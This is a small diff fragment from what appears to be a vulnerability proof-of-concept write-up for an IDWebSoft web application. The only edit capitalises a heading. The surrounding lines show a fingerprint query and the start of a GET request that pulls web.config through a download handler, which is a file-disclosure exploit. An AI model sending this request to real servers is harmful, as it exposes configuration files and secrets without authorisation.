@@ -8,7 +8,7 @@
 body="IDWebSoft/"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /IDWebSoft/Common/Handler/Download.aspx?FileName=web.config&FileTitle= HTTP/1.1
